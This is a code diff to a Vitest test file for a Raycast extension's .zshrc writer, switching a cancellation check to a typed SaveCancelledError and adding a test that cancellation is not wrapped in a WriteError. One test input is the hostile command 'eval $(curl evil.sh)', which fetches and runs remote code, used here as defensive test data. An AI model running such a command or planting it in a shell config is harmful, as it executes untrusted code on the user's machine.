@@ -16,6 +16,7 @@ import {
 import { readFile, writeFile, stat, rename, lstat, realpath, access, copyFile } from "fs/promises";
 import { getPreferenceValues, confirmAlert } from "@raycast/api";
 import { validateFilePath, validateFileSize, validateFilePathForWrite, validateZshrcContent } from "../utils/sanitize";
+import { SaveCancelledError, WriteError } from "../utils/errors";
 import { vi } from "vitest";
 import { homedir } from "os";
 
@@ -369,8 +370,21 @@ describe("zsh.ts", () => {
       });
       mockConfirmAlert.mockResolvedValue(false);
 
-      await expect(writeZshrcFile("eval $(curl evil.sh)")).rejects.toThrow("Save cancelled");
+      await expect(writeZshrcFile("eval $(curl evil.sh)")).rejects.toThrow(SaveCancelledError);
       expect(mockWriteFile).not.toHaveBeenCalled();
+    });
+
+    it("does not wrap cancellation in a WriteError", async () => {
+      mockValidateFilePathForWrite.mockResolvedValue(true);
+      mockValidateZshrcContent.mockReturnValue({
+        isValid: false,
+        errors: ["Line 1 is too long (1200 characters)"],
+      });
+      mockConfirmAlert.mockResolvedValue(false);
+
+      const error = await writeZshrcFile("x").catch((e: unknown) => e);
+      expect(error).toBeInstanceOf(SaveCancelledError);
+      expect(error).not.toBeInstanceOf(WriteError);
     });
 
     it("should not show an alert when validation passes", async () => {
